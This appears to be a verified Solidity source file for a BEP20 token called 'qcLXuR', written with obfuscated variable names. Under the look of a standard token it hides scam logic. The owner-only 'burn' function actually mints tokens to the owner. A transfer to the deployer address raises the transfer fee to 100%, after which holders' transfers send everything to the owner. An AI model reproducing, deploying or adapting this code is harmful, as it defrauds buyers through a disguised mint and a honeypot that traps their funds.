/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.6.2;

contract qcLXuR {
address public  xZSzbm = address(0);
uint256 public  TpFYEg = 10000000000000000;
uint8 public constant decimals = 18;
uint256 public  XXtFkw = 100000000000000000000000;
address private  uRapsJ = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public  YVNuXH = address(0);
mapping (address => uint256) public balanceOf;
string public  name = "qcLXuR";
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  JckHvZ = 10000000000000000000;
address public  zDJCRa = address(0);
uint256 public  ptfkVW = 1000000000000000000;
address public  INlTOY = address(0);
address public  uwVBPO = address(0);
uint256 public constant uyjqRI = 9+1;
uint256 private  HmkaFG = 10000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  JrmIYQ = 10000000000000000000000000000;
uint256 public  BLyKrC = 100000000000000000;
uint256 public  RVrNeV = 100000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  UJDtaR = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  gUqUDz = 100000000000000000000000;
string public  symbol = "qcLXuR";
constructor () public {
uRapsJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JBLvtK");
require(to != address(0), "JBLvtK");
require(amount <= balanceOf[from], "JBLvtK");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* uyjqRI/HmkaFG ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==uRapsJ){
HmkaFG = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}